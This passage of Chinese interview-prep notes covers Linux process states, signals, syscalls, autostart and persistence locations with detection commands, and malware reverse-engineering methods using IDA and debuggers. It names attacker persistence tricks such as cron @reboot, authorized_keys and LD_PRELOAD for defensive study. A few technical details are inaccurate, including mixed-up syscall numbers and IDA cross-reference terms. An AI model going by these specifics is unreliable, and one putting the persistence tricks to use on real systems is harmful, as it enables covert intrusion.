<li><strong>孤儿进程</strong>：如果父进程在子进程之前终止，子进程就会成为一个<strong>孤儿进程（Orphan Process）</strong>。在这种情况下，操作系统的 <strong><code>init</code> 进程（PID 1）</strong> 会收养这个孤儿进程，成为它的新父进程。<code>init</code> 进程会负责清理这些孤儿进程，防止它们变成永久的僵尸进程</li>
</ul>
<hr>
<h3 id="孤儿进程和僵尸进程区别"><a href="#孤儿进程和僵尸进程区别" class="headerlink" title="孤儿进程和僵尸进程区别"></a>孤儿进程和僵尸进程区别</h3><p><strong>僵尸进程</strong></p>
<p><strong>僵尸进程</strong>是已经<strong>终止</strong>（执行完毕或被杀死）但其父进程尚未<strong>收集</strong>（<code>wait()</code> 或 <code>waitpid()</code> 系统调用）其退出状态的进程</p>
<ul>
<li><strong>产生原因</strong>：当一个子进程终止时，它会向操作系统发送一个信号，表示自己已完成任务。操作系统会释放该进程几乎所有的资源，包括内存和文件描述符。然而，它的进程描述符（PCB，Process Control Block）仍然保留在内存中，以便父进程能够读取它的退出状态（例如，是否成功执行、退出码是多少）。如果父进程没有及时调用 <code>wait()</code> 或 <code>waitpid()</code> 来获取这些信息并释放子进程的 PCB，子进程就会一直处于“僵尸”状态</li>
<li><strong>特点</strong>：<ul>
<li>它<strong>不占用</strong>内存空间</li>
<li>它<strong>会占用</strong>一个 PID，因为 PCB 还没有被回收</li>
<li>由于 PID 是有限的，大量的僵尸进程可能会导致系统没有可用的 PID，从而无法创建新的进程</li>
</ul>
</li>
<li><strong>如何识别</strong>：在 <code>ps</code> 或 <code>top</code> 命令的输出中，僵尸进程的状态通常显示为 <code>&lt;defunct&gt;</code> 或 <code>Z</code></li>
<li><strong>处理方法</strong>：唯一能清理僵尸进程的方法是<strong>杀死它的父进程</strong>。当父进程被杀死后，这个僵尸进程就会变成一个孤儿进程，并被 <code>init</code> 进程（PID 1）收养，<code>init</code> 进程会负责清理它。</li>
</ul>
<p><strong>孤儿进程</strong></p>
<p><strong>孤儿进程</strong>是指<strong>正在运行</strong>但其父进程已经<strong>终止</strong>的进程</p>
<ul>
<li><strong>产生原因</strong>：当父进程在子进程之前退出，子进程就成了“孤儿”</li>
<li><strong>特点</strong>：<ul>
<li>它<strong>仍然在运行</strong>，只是失去了它的原始父进程</li>
<li>它<strong>不会</strong>成为系统的负担，因为它会自动被操作系统中最特殊的进程——<code>init</code> 进程（PID 1）收养</li>
</ul>
</li>
<li><strong>如何识别</strong>：在 <code>ps</code> 命令的输出中，你可以看到它的父进程 ID（PPID）变成了 <code>1</code></li>
<li><strong>处理方法</strong>：孤儿进程会被 <code>init</code> 进程<strong>收养</strong>。<code>init</code> 进程会像对待自己的子进程一样，在它最终终止时调用 <code>wait()</code> 来收集其退出状态，从而防止它变成一个僵尸进程</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>僵尸进程（Zombie Process）</th>
<th>孤儿进程（Orphan Process）</th>
</tr>
</thead>
<tbody><tr>
<td>状态</td>
<td>已终止，但其进程描述符未被父进程回收。</td>
<td>正在运行，但其父进程已终止。</td>
</tr>
<tr>
<td>产生原因</td>
<td>父进程没有调用 wait() 或 waitpid()。</td>
<td>父进程在子进程之前退出。</td>
</tr>
<tr>
<td>系统影响</td>
<td>占用 PID，大量存在会导致 PID 资源耗尽。</td>
<td>通常无害，会被 init 进程收养。</td>
</tr>
<tr>
<td>处理方式</td>
<td>杀死其父进程。</td>
<td>由 init 进程自动收养并管理，无需人工干预。</td>
</tr>
<tr>
<td>ps 状态</td>
<td>Z 或 <defunct></td>
<td>运行中，但其 PPID（父进程 ID）为 1。</td>
</tr>
</tbody></table>
<hr>
<h3 id="Kill-一个进程的时候都发生了那些事情，从父子进程角度讲"><a href="#Kill-一个进程的时候都发生了那些事情，从父子进程角度讲" class="headerlink" title="Kill 一个进程的时候都发生了那些事情，从父子进程角度讲"></a>Kill 一个进程的时候都发生了那些事情，从父子进程角度讲</h3><p><strong>1. 信号发送与接收</strong></p>
<p>当你执行 <code>kill &lt;PID&gt;</code> 时，操作系统内核会向指定的进程（通常是子进程）发送 <code>SIGTERM</code> 信号</p>
<ul>
<li><strong>如果目标进程是子进程</strong>：父进程并没有直接参与这个过程。信号是由内核发送给目标进程的，由内核负责后续的调度和处理</li>
<li><strong>如果目标进程是父进程</strong>：同样，信号由内核直接发送。但父进程的死亡会对其子进程产生连锁反应</li>
</ul>
<p><strong>2. 进程对信号的响应</strong></p>
<p>这是最关键的一步，也是 <code>SIGTERM</code> 和 <code>SIGKILL</code> 最大的区别所在</p>
<ul>
<li><strong>接收 <code>SIGTERM</code>（友好终止）</strong>：<ul>
<li>这是一个“软性”的终止请求，目标进程可以**捕获（handle）<strong>或</strong>忽略（ignore）**这个信号</li>
<li>如果目标进程有信号处理程序，它会执行相应的清理工作，例如：<ul>
<li>释放占用的内存、文件描述符等资源</li>
<li>保存当前的工作状态</li>
<li>优雅地关闭网络连接</li>
</ul>
</li>
<li>清理完成后，进程会正常退出</li>
<li><strong>父子进程关系</strong>：如果被 <code>kill</code> 的是父进程，并且父进程捕获了 <code>SIGTERM</code> 并执行了清理，它可能会在退出前向它的子进程发送信号（例如 <code>SIGTERM</code>），或者等待子进程先退出。但如果父进程直接退出，其子进程会变成<strong>孤儿进程</strong>，被 <code>init</code> 进程收养</li>
</ul>
</li>
<li><strong>接收 <code>SIGKILL</code>（强制终止）</strong>：<ul>
<li>这是一个“硬性”的终止请求，目标进程<strong>无法捕获、忽略或阻止</strong>这个信号</li>
<li>操作系统内核会直接终止这个进程，<strong>不会</strong>给它任何机会执行清理工作</li>
<li>这种方式非常粗暴，可能导致数据丢失、资源泄露（例如，没有关闭的文件、没有释放的锁），所以通常不建议作为首选</li>
<li><strong>父子进程关系</strong>：<ul>
<li>如果被 <code>kill -9</code> 的是<strong>子进程</strong>，它会立即被内核终止。子进程会进入<strong>僵尸状态</strong>，其父进程需要调用 <code>wait()</code> 来收集它的退出状态，否则它会一直占用一个 PID</li>
<li>如果被 <code>kill -9</code> 的是<strong>父进程</strong>，父进程会立即被内核强制终止。其所有子进程都会立刻变成<strong>孤儿进程</strong>，并被 <code>init</code> 进程（PID 1）收养。<code>init</code> 进程会负责等待它们终止，并清理它们的僵尸状态，避免系统资源泄露</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>3. 进程状态转换与资源回收</strong></p>
<p>无论以何种方式终止，进程都会经历以下状态转换：</p>
<ul>
<li><strong>从运行状态到终止状态</strong>：当一个进程终止后，它的所有资源（如内存页、文件描述符等）都会被释放</li>
<li><strong>成为僵尸进程</strong>：一个进程终止后，它的进程描述符（PCB）仍然保留在内存中，记录其退出状态，等待父进程来“收尸”。此时，该进程就进入了僵尸状态</li>
<li><strong>父进程的责任</strong>：为了避免子进程成为僵尸，父进程的责任是调用 <code>wait()</code> 或 <code>waitpid()</code>。一旦调用，内核就会将僵尸子进程的 PCB 彻底移除，释放其占用的 PID，完成最终的清理工作</li>
</ul>
<hr>
<h3 id="Linux-开机自启动方式"><a href="#Linux-开机自启动方式" class="headerlink" title="Linux 开机自启动方式"></a>Linux 开机自启动方式</h3><p><strong>系统级别的自启动方式</strong></p>
<p>这些是系统在引导过程中自动执行的脚本或服务，通常用于启动核心服务和守护进程</p>
<p><strong>1. Systemd</strong></p>
<p>Systemd 是现代 Linux 发行版（如 Ubuntu 16.04+、CentOS 7+、Debian 8+）中最主流的启动管理器。它使用 <strong><code>.service</code></strong> 单元文件来定义服务，这些文件通常存放在以下目录：</p>
<ul>
<li><code>/etc/systemd/system/</code>：管理员创建或修改的服务文件</li>
<li><code>/usr/lib/systemd/system/</code>：软件包安装的服务文件，不建议直接修改</li>
</ul>
<p>恶意程序可能会在这些目录中创建或修改 <code>.service</code> 文件，将自己伪装成一个合法的服务</p>
<p><strong>如何检查：</strong></p>
<ul>
<li><code>systemctl list-unit-files --type=service</code>：列出所有服务的单元文件</li>
<li><code>systemctl status &lt;service_name&gt;</code>：检查特定服务的状态</li>
<li><code>systemctl cat &lt;service_name&gt;</code>：查看服务文件的具体内容，包括执行命令</li>
</ul>
<p><strong>2. Init 脚本</strong></p>
<p>在较旧的 Linux 发行版中（如 CentOS 6、Ubuntu 14.04），系统使用 Init 脚本来管理启动</p>
<ul>
<li><strong>SysVinit</strong>：脚本存放在 <code>/etc/init.d/</code> 目录，通过 <code>rcX.d</code> 目录（X代表运行级别）的软链接来控制服务的启动顺序</li>
<li><strong>Upstart</strong>：配置文件存放在 <code>/etc/init/</code> 目录</li>
</ul>
<p>恶意程序可能会在 <code>/etc/init.d/</code> 中添加新脚本，或在 <code>/etc/rcX.d/</code> 中创建软链接，从而在系统启动时被执行</p>
<p><strong>如何检查：</strong></p>
<ul>
<li><code>ls -l /etc/init.d/</code>：查看所有 Init 脚本</li>
<li><code>ls -l /etc/rc?.d/</code>：查看不同运行级别下的软链接</li>
</ul>
<p><strong>用户级别的自启动方式</strong></p>
<p>这些方式通常只在特定用户登录后才会被执行，常用于启动桌面环境下的应用程序</p>
<p><strong>1. Cron 定时任务</strong></p>
<p>Cron 用于在指定的时间自动执行任务，也可以被配置为在系统启动时执行</p>
<ul>
<li><code>/etc/crontab</code>：系统级别的 Cron 文件，可用于设置在系统启动时执行的脚本（使用 <code>@reboot</code> 关键字）</li>
<li><code>/etc/cron.d/</code>：存放独立的系统级 Cron 文件</li>
<li><code>/var/spool/cron/crontabs/&lt;username&gt;</code>：用户级别的 Cron 文件</li>
</ul>
<p>恶意程序可能会利用 <code>@reboot</code> 字段，将自己添加到这些文件中，从而实现开机自启动</p>
<p><strong>如何检查：</strong></p>
<ul>
<li><code>cat /etc/crontab</code>：查看系统 Cron 文件</li>
<li><code>ls -l /etc/cron.d/</code>：查看独立 Cron 文件</li>
<li><code>crontab -l</code>：查看当前用户的 Cron 任务</li>
<li><code>crontab -l -u &lt;username&gt;</code>：查看特定用户的 Cron 任务。</li>
</ul>
<p><strong>2. 用户配置文件</strong></p>
<p>许多 Shell 和桌面环境都有自己的启动文件</p>
<ul>
<li><code>~/.bashrc</code>、<code>~/.bash_profile</code>、<code>~/.profile</code>：这些文件在用户登录时会被 Shell 加载，恶意代码可以被注入其中</li>
<li><code>~/.config/autostart/</code>：桌面环境（如 GNOME、KDE）下的自启动目录。这个目录下的 <code>.desktop</code> 文件可以指定一个程序在用户登录后自动运行</li>
</ul>
<p><strong>如何检查：</strong></p>
<ul>
<li><code>cat ~/.bashrc</code>、<code>~/.bash_profile</code> 等：检查可疑命令</li>
<li><code>ls -l ~/.config/autostart/</code>：查看可疑的 <code>.desktop</code> 文件</li>
</ul>
<p><strong>其他隐蔽的自启动方式</strong></p>
<p>除了上述常见方式，恶意程序还可能采用更隐蔽的手段。</p>
<p><strong>1. SUID&#x2F;SGID 文件</strong></p>
<p>虽然不是直接的自启动方式，但拥有 SUID 或 SGID 权限的程序可以在不询问用户密码的情况下以高权限运行，这对于持久化攻击非常有用。攻击者可以利用这些程序在系统启动后被调用时，执行自己的恶意代码</p>
<p><strong>如何检查：</strong></p>
<ul>
<li><code>find / -type f -perm /4000 2&gt;/dev/null</code>：查找所有 SUID 文件。</li>
<li><code>find / -type f -perm /2000 2&gt;/dev/null</code>：查找所有 SGID 文件</li>
</ul>
<p><strong>2. SSH 密钥</strong></p>
<p>攻击者可以修改 <code>~/.ssh/authorized_keys</code> 文件，添加自己的公钥，从而在无需密码的情况下远程登录。虽然不是开机自启动，但它能让攻击者在系统重启后仍能获得持续访问权限</p>
<p><strong>如何检查：</strong></p>
<ul>
<li><code>cat ~/.ssh/authorized_keys</code>：检查是否存在陌生的公钥</li>
</ul>
<p><strong>3. 动态链接库</strong></p>
<p><code>LD_PRELOAD</code> 环境变量可以让攻击者在程序启动时预先加载一个恶意动态链接库（<code>.so</code> 文件），从而劫持合法程序的函数调用，实现代码注入。如果将 <code>LD_PRELOAD</code> 变量写入全局配置文件（如 <code>/etc/profile</code>），则会对所有用户生效</p>
<p><strong>如何检查：</strong></p>
<ul>
<li><code>cat /etc/profile</code>、<code>~/.bashrc</code> 等：检查 <code>LD_PRELOAD</code> 环境变量是否被设置</li>
</ul>
<hr>
<h3 id="Linux-有哪些系统调用"><a href="#Linux-有哪些系统调用" class="headerlink" title="Linux 有哪些系统调用"></a>Linux 有哪些系统调用</h3><p><strong>1. 进程管理相关系统调用</strong></p>
<p>这些调用用于创建、销毁和管理进程</p>
<ul>
<li><code>fork()</code>: 创建一个子进程，它是父进程的精确副本</li>
<li><code>execve()</code>: 在当前进程中加载并执行一个新程序</li>
<li><code>wait4()</code>: 暂停当前进程，等待子进程退出或停止</li>
<li><code>exit()</code>: 终止当前进程并返回一个状态码。</li>
<li><code>getpid()</code>: 获取当前进程的 ID。</li>
</ul>
<p><strong>2. 文件和设备管理相关系统调用</strong></p>
<p>这些调用是应用程序与文件系统交互的核心，包括文件的创建、读写和权限管理</p>
<ul>
<li><code>open()</code>: 打开或创建一个文件，返回一个文件描述符</li>
<li><code>read()</code>: 从文件描述符中读取数据</li>
<li><code>write()</code>: 向文件描述符中写入数据</li>
<li><code>close()</code>: 关闭一个文件描述符</li>
<li><code>lseek()</code>: 移动文件读写指针的位置</li>
<li><code>stat()</code>: 获取文件的状态信息，例如大小、权限和创建时间</li>
<li><code>unlink()</code>: 删除一个文件</li>
<li><code>ioctl()</code>: 用于设备特有的 I&#x2F;O 操作</li>
</ul>
<p><strong>3. 信息维护相关系统调用</strong></p>
<p>这些调用用于获取或设置系统信息，如时间、用户信息和系统配置</p>
<ul>
<li><code>gettimeofday()</code>: 获取当前时间和时区信息</li>
<li><code>uname()</code>: 获取操作系统的名称和版本信息</li>
<li><code>getuid()</code>: 获取当前用户的有效 ID</li>
<li><code>getgid()</code>: 获取当前用户的有效组 ID</li>
</ul>
<p><strong>4. 通信相关系统调用</strong></p>
<p>这些调用主要用于进程间通信（IPC）和网络通信</p>
<ul>
<li><code>pipe()</code>: 创建一个匿名管道，用于父子进程间的通信</li>
<li><code>socket()</code>: 创建一个网络套接字</li>
<li><code>connect()</code>: 连接到远程主机</li>
<li><code>bind()</code>: 将套接字绑定到一个地址和端口</li>
<li><code>listen()</code>: 监听来自客户端的连接请求</li>
<li><code>accept()</code>: 接受一个客户端的连接</li>
</ul>
<p><strong>5. 内存管理相关系统调用</strong></p>
<p>这些调用用于分配、释放和管理进程的内存</p>
<ul>
<li><code>brk()</code>: 改变数据段的结束地址</li>
<li><code>mmap()</code>: 创建一个内存映射，用于在文件中或设备中进行内存操作</li>
<li><code>munmap()</code>: 撤销 <code>mmap()</code> 创建的内存映射</li>
</ul>
<hr>
<h3 id="说说-Linux-下的-Syscall"><a href="#说说-Linux-下的-Syscall" class="headerlink" title="说说 Linux 下的 Syscall"></a>说说 Linux 下的 Syscall</h3><p><strong>什么是系统调用（Syscall）？</strong></p>
<p>在 Linux（及其他类 Unix 操作系统）中，<strong>系统调用</strong>是用户空间程序（User-space program）与内核（Kernel）之间进行交互的唯一接口</p>
<p>你可以将内核想象成一个操作系统的“核心”，它负责管理和控制计算机的所有硬件资源，例如 CPU、内存、硬盘和网络。而我们日常使用的所有应用程序，比如浏览器、文本编辑器或命令行工具，都运行在<strong>用户空间</strong></p>
<p>为了确保系统的稳定和安全，用户空间的程序不能直接访问硬件。当一个程序需要做一些“特权”操作时，比如：</p>
<ul>
<li>读写文件</li>
<li>创建或销毁进程</li>
<li>分配内存</li>
<li>发送网络数据包</li>
<li>获取当前时间</li>
</ul>
<p>它就必须通过一个<strong>系统调用</strong>来向内核发出请求。内核会检查这个请求是否合法，如果合法，就会代表用户程序执行这个操作</p>
<p><strong>系统调用的工作流程</strong></p>
<p>一个典型的系统调用流程如下：</p>
<ol>
<li><strong>准备参数</strong>：用户空间的程序将要传递给内核的参数（例如，打开文件时的文件名和权限）放入指定的通用寄存器中</li>
<li><strong>设置系统调用号</strong>：程序将一个唯一的<strong>系统调用号</strong>（Syscall Number）放入另一个特定寄存器（在 x86 架构中通常是 <code>EAX</code> 或 <code>RAX</code>）中。这个号码告诉内核，程序想要执行哪一个系统调用（比如 <code>open</code> 对应 <code>2</code>，<code>read</code> 对应 <code>3</code>）</li>
<li><strong>触发软中断</strong>：程序执行一条特殊的<strong>中断指令</strong>（例如 <code>int 0x80</code> 在 32 位系统上，或者 <code>syscall</code> 在 64 位系统上）。这条指令会暂停用户程序的执行，并强制 CPU 将控制权从用户空间转移到内核空间</li>
<li><strong>内核处理</strong>：内核接收到中断后，会根据寄存器中的系统调用号，在系统调用表中查找并执行对应的内核函数</li>
<li><strong>返回结果</strong>：内核函数执行完毕后，会将结果（成功或失败的代码）放入一个寄存器中，并执行一条返回指令，将控制权和结果返回给用户空间的程序</li>
</ol>
<h1 id="24-逆向破解"><a href="#24-逆向破解" class="headerlink" title="24- 逆向破解"></a>24- 逆向破解</h1><h3 id="恶意样本给出函数家族的-md5，如何进行分类"><a href="#恶意样本给出函数家族的-md5，如何进行分类" class="headerlink" title="恶意样本给出函数家族的 md5，如何进行分类"></a>恶意样本给出函数家族的 md5，如何进行分类</h3><p><strong>1. 样本预处理</strong></p>
<p>首先，我们需要拿到恶意样本文件。为了确保分析的安全性，这些样本通常在沙箱环境或隔离的虚拟机中运行和处理</p>
<p><strong>2. 静态分析与函数提取</strong></p>
<p>这是最关键的一步。我们需要使用专业的反汇编或反编译工具（如 IDA Pro、Ghidra、Binary Ninja 等）对样本进行静态分析，提取其中的所有函数</p>
<p>在提取过程中，我们要确保做到以下几点：</p>
<ul>
<li><strong>识别所有函数：</strong> 准确地识别出样本中所有的函数入口点和函数体</li>
<li><strong>清理和标准化：</strong> 许多编译器会在函数中插入一些无用的代码（如栈帧设置、调试信息等）。为了确保哈希的一致性，我们需要<strong>清理</strong>这些与核心逻辑无关的代码。例如，可以使用工具去除 NOP（空操作）指令、对齐填充等</li>
<li><strong>标准化函数代码：</strong> 即使是相同的逻辑，不同的编译器或编译选项也会产生略有差异的机器码。为了让哈希值保持一致，我们需要对函数进行<strong>标准化</strong>。这通常涉及将函数体转化为一种更抽象、更稳定的表示形式，比如：<ul>
<li><strong>代码归一化（Code Normalization）：</strong> 替换寄存器名称、删除地址无关的指令，使得哈希值不受编译地址的影响</li>
<li><strong>指令序列哈希：</strong> 只对核心的指令序列进行哈希，忽略一些可变的部分</li>
</ul>
</li>
</ul>
<p><strong>3. 计算函数哈希</strong></p>
<p>在函数代码被标准化和清理后，我们就可以计算它们的 MD5 哈希值了。这里通常采用两种策略：</p>
<ul>
<li><strong>MD5 哈希：</strong> 直接对标准化后的函数二进制代码或其序列进行 MD5 计算。这是最简单也最直接的方法</li>
<li><strong>模糊哈希（Fuzzy Hashing）：</strong> 对于一些变种较大的函数，使用 MD5 可能会失效。这时，我们可以使用模糊哈希算法，如 <strong>ssdeep</strong> 或 <strong>TLSH</strong>。这些算法能够计算出相似度分数，而不是一个绝对的哈希值，从而可以匹配那些有细微改动的函数</li>
</ul>
<p><strong>4. 构建哈希数据库</strong></p>
<p>在提取并计算出哈希值后，我们需要将这些信息存储到一个哈希数据库中。这个数据库通常包含以下信息：</p>
<ul>
<li><strong>函数 MD5 哈希值</strong></li>
<li><strong>该函数所属的样本文件名或哈希</strong></li>
<li><strong>该函数的家族分类信息（如果已知）</strong></li>
<li><strong>该函数的功能描述（如果分析过）</strong></li>
</ul>
<p>通过不断地分析新的样本并填充这个数据库，我们就能建立一个庞大的恶意软件函数指纹库</p>
<p><strong>5. 家族分类</strong></p>
<p>现在我们有了函数哈希和数据库，就可以开始进行分类了</p>
<ul>
<li><p><strong>第一步：</strong> 拿到一个新的未知样本</p>
</li>
<li><p><strong>第二步：</strong> 按照上述步骤，提取该样本中的所有函数，并计算它们的 MD5 哈希值</p>
</li>
<li><p><strong>第三步：</strong> 将这些新计算出来的函数哈希值与我们的哈希数据库进行比对</p>
</li>
<li><p><strong>第四步：</strong> 如果一个或多个函数哈希在数据库中找到了匹配项，并且这些匹配项都指向同一个恶意软件家族（例如，都匹配到“Emotet”家族中的多个样本），那么我们就可以初步判断这个新样本也属于这个家族</p>
</li>
<li><p><strong>第五步：</strong> 如果匹配到了多个不同的家族，我们需要进行进一步的分析，比如：</p>
<ul>
<li><strong>函数数量匹配：</strong> 看看哪个家族匹配到的函数数量最多</li>
<li><strong>核心功能函数匹配：</strong> 某些函数（如加密、持久化）比其他函数（如日志记录）更能代表一个家族的特征。如果核心功能函数匹配上了，分类的准确度会更高</li>
</ul>
<hr>
<h3 id="面对静态编译的大型木马如何通过-IDA-定位其网络传输部分的逻辑"><a href="#面对静态编译的大型木马如何通过-IDA-定位其网络传输部分的逻辑" class="headerlink" title="面对静态编译的大型木马如何通过 IDA 定位其网络传输部分的逻辑"></a>面对静态编译的大型木马如何通过 IDA 定位其网络传输部分的逻辑</h3></li>
</ul>
<p><strong>第一步：宏观审视与初步筛选</strong></p>
<p>在深入细节之前，先从高层次了解程序的整体结构</p>
<ol>
<li><p><strong>字符串分析 (Strings)</strong>：这是最有效的切入点。在 IDA Pro 中打开 <code>View -&gt; Open subviews -&gt; Strings</code> 窗口。大型木马通常会包含大量的硬编码字符串，这些字符串往往与网络通信直接相关。寻找以下关键字：</p>
<ul>
<li><strong>IP 地址或域名</strong>：<code>&quot;192.168.1.1&quot;</code>, <code>&quot;example.com&quot;</code>, <code>&quot;evil.org&quot;</code></li>
<li><strong>URL 路径</strong>：<code>&quot;/api/v1/data&quot;</code>, <code>&quot;download.php&quot;</code>, <code>&quot;update&quot;</code></li>
<li><strong>User-Agent</strong>：<code>&quot;Mozilla/5.0&quot;</code>, <code>&quot;User-Agent:&quot;</code></li>
<li><strong>协议头</strong>：<code>&quot;HTTP/1.1&quot;</code>, <code>&quot;GET&quot;</code>, <code>&quot;POST&quot;</code>, <code>&quot;FTP&quot;</code>, <code>&quot;socks&quot;</code></li>
<li><strong>端口号</strong>：<code>&quot;Port:&quot;</code>, <code>&quot;8080&quot;</code>, <code>&quot;443&quot;</code></li>
<li><strong>错误信息</strong>：<code>&quot;Connection failed&quot;</code>, <code>&quot;Socket error&quot;</code>, <code>&quot;Network busy&quot;</code></li>
</ul>
<p>一旦找到可疑的字符串，右键点击它，选择 <code>Xrefs from</code> （交叉引用），就可以跳转到使用该字符串的代码位置。这通常是网络通信函数附近</p>
</li>
<li><p><strong>函数列表筛选 (Functions)</strong>：在 <code>Functions</code> 窗口中，IDA 会列出所有识别出的函数。虽然数量可能非常庞大，但我们可以通过函数名进行筛选</p>
<ul>
<li><strong>自动生成的函数名</strong>：如果 IDA Pro 识别了标准库（如 <code>libc</code> 或 <code>libcurl</code>）的函数，它会给它们一个有意义的名字。搜索与网络相关的函数名：<code>socket</code>, <code>connect</code>, <code>send</code>, <code>recv</code>, <code>bind</code>, <code>listen</code>, <code>inet_addr</code>, <code>gethostbyname</code>, <code>HttpSendRequest</code> 等。这些是网络编程的常用 API</li>
<li><strong>被调用的函数</strong>：点击这些被识别的网络函数，查看它们的 <code>Xrefs to</code> （交叉引用），这会告诉你木马代码中哪些地方调用了这些网络 API。这通常就是网络通信逻辑的起点</li>
</ul>
</li>
</ol>
<p><strong>第二步：深入分析与代码追踪</strong></p>
<p>找到可疑的网络 API 调用后，接下来要做的就是分析其上下文</p>
<ol>
<li><strong>参数分析</strong>：检查网络 API 调用的参数<ul>
<li><code>send/recv</code>：观察它们的缓冲区参数，这可以帮助你判断数据是发送还是接收，并了解数据的大小和内容</li>
<li><code>connect</code>：查看它的地址和端口参数，这会告诉你木马试图连接哪个远程服务器</li>
<li><code>bind/listen</code>：如果木马是一个服务器，会使用这些函数。查看它们的端口参数，了解木马监听的端口号</li>
</ul>
</li>
<li><strong>向上追溯调用链</strong>：从找到的网络 API 调用点开始，沿着<strong>函数调用链</strong>向上追溯<ul>
<li>使用 IDA Pro 的 <code>Graph View</code> (空格键)，这会以图形化方式显示函数的控制流</li>
<li>检查调用了网络 API 的函数。这个函数可能是一个高层封装，比如 <code>send_data_to_c2</code></li>
<li>进一步向上追溯，你可能会发现一个主循环或主逻辑函数，它负责决定何时进行网络通信</li>
</ul>
</li>
<li><strong>识别加密&#x2F;编码逻辑</strong>：许多木马在网络传输前会对数据进行加密或编码，以逃避检测<ul>
<li><strong>特征</strong>：在 <code>send</code> 或 <code>recv</code> 调用之前，寻找复杂的循环、数学运算或位操作。这很可能就是数据处理（加密&#x2F;编码）的代码</li>
<li><strong>字符串线索</strong>：查找 <code>xor</code>, <code>aes</code>, <code>rsa</code>, <code>base64</code> 等字符串，它们可能是加密或编码算法的实现</li>
</ul>
</li>
</ol>
<p><strong>第三步：高级分析与数据流追踪</strong></p>
<p>如果常规方法不起作用，可能需要更深入的分析</p>
<ol>
<li><strong>数据流分析</strong>：使用 IDA Pro 或其他工具（如 Binary Ninja）来追踪数据从源头到网络API调用的路径<ul>
<li><strong>源头</strong>：数据的来源可能是键盘记录、文件读取、屏幕截图等</li>
<li><strong>追踪</strong>：从这些可能的源头变量开始，分析它们如何被处理、加密，最终作为 <code>send</code> 函数的参数</li>
<li><strong>使用插件</strong>：一些 IDA 插件（如 <strong>Lighthouse</strong>）可以辅助进行数据流分析和图表可视化</li>
</ul>
</li>
<li><strong>交叉引用矩阵</strong>：在 <code>Functions</code> 窗口中，你可以查看函数之间的交叉引用矩阵。通过分析哪些函数被频繁调用，哪些函数调用了其他网络相关的函数，可以构建一个更完整的网络通信图谱</li>
</ol>
<hr>
<h3 id="如何动态地去找导入表"><a href="#如何动态地去找导入表" class="headerlink" title="如何动态地去找导入表"></a>如何动态地去找导入表</h3><p><strong>为什么要动态地查找？</strong></p>
<p>静态地查找导入表非常简单，我们只需要解析 PE 文件头中的数据目录（Data Directory），找到导入表的结构体 <code>IMAGE_IMPORT_DESCRIPTOR</code>，然后就可以找到所有的导入函数。但这种方法有几个局限性：</p>
<ol>
<li><strong>脱壳（Unpacking）：</strong> 许多恶意软件会使用加壳技术（packer），将原始的 PE 文件压缩或加密。这种情况下，原始的导入表会被隐藏或破坏，静态分析工具无法找到它。当程序运行时，加壳器会自行解压和修复导入表，因此只有在内存中才能找到真正的导入表</li>
<li><strong>动态加载（Dynamic Loading）：</strong> 程序可能会使用 <code>LoadLibrary</code> 和 <code>GetProcAddress</code> 等函数在运行时动态加载 DLL 和获取函数地址。这种方式下，导入的函数根本不会出现在 PE 文件的静态导入表中</li>
<li><strong>防止逆向工程：</strong> 有些程序开发者故意混淆或破坏导入表，以增加逆向工程的难度</li>
</ol>
<p>因此，动态地查找导入表是进行脱壳、恶意软件分析和深入逆向工程的必备技能</p>
<p><strong>方法一：利用 <code>EAT</code> (导出地址表)</strong></p>
<p>这是最直接、也是最不寻常的方法。如果一个程序（比如一个 DLL）将自己的导入表中的函数地址作为导出函数暴露出来，你就可以通过解析它的<strong>导出表 (Export Address Table, EAT)</strong> 来找到导入表。但这种情况非常少见，通常只在一些特殊的系统 DLL 或驱动程序中出现。这种方法不具有通用性</p>
<p><strong>方法二：利用函数调用指令</strong></p>
<p>这是最常见、最实用的方法。当程序调用一个导入函数时，通常会使用 <code>CALL</code> 指令，其目标地址就是导入表中的一个条目</p>
<p><strong>具体步骤：</strong></p>
<ol>
<li><strong>调试器附加：</strong> 使用调试器（如 OllyDbg、x64dbg、IDA Pro Debugger）附加到目标进程</li>
<li><strong>设置断点：</strong> 在程序执行的早期，比如 <code>main</code> 函数或 <code>WinMain</code> 函数的入口点设置断点</li>
<li><strong>单步调试&#x2F;跟踪：</strong> 逐步执行（Step Over）程序，并密切关注 <code>CALL</code> 指令</li>
<li><strong>识别导入调用：</strong><ul>
<li><strong>相对 <code>CALL</code>:</strong> 如果你看到 <code>CALL [地址]</code> 这样的指令，并且这个地址是一个外部函数的地址，那么这个 <code>[地址]</code> 就是一个导入表项。例如，<code>CALL DWORD PTR [EAX]</code></li>
<li><strong>直接 <code>CALL</code>:</strong> 如果你看到 <code>CALL MessageBoxA</code>，这通常是 IDA Pro 这样的反汇编器帮你标记的，它已经识别出这个调用指向了一个导入函数</li>
</ul>
</li>
<li><strong>内存转储和分析：</strong> 当你找到一个导入表项的地址后，你可以从这个地址开始，向前和向后扫描内存，寻找连续的、看起来像函数指针的地址序列。这个序列很可能就是完整的导入表。然后你可以将这一块内存转储出来进行进一步分析</li>
</ol>
<p>这种方法需要对汇编语言有深入理解，并且需要耐心和细致的调试</p>
<p><strong>方法三：利用内存断点和内存扫描</strong></p>
<p>当程序加载时，加载器会向导入表写入外部函数的真实地址。我们可以利用这个特性</p>
<p><strong>具体步骤：</strong></p>
<ol>
<li><strong>调试器附加：</strong> 附加到目标进程</li>
<li><strong>查找 <code>IMAGE_IMPORT_DESCRIPTOR</code>：</strong> 使用静态分析工具（如 PE Explorer、CFF Explorer）找到 PE 文件中导入表的 <code>RVA</code> (Relative Virtual Address)</li>
<li><strong>计算内存地址：</strong> 将 <code>RVA</code> 加上基址（ImageBase）得到导入表在内存中的实际地址</li>
<li><strong>设置硬件断点：</strong> 在导入表的第一个条目上设置一个硬件写入断点（Hardware Write Breakpoint）</li>
<li><strong>运行程序：</strong> 运行程序。当加载器填充导入表时，断点会被触发。这通常发生在 <code>LoadLibrary</code> 函数调用之后，但在 <code>main</code> 函数之前</li>
<li><strong>分析内存：</strong> 断点触发后，你就可以检查内存中的导入表，它的内容已经被加载器填充好了。如果程序进行了脱壳，此时的导入表才是真实的</li>
</ol>
<p><strong>另一种高级变体是：</strong></p>
<ul>
<li>在程序执行早期，在整个 <code>.text</code> 段（代码段）设置一个硬件写入断点。当断点触发时，检查写入的地址是否在代码段内部，并分析写入的指令。这可以用来检测自修改代码，是更高级的逆向技术</li>
</ul>
<hr>
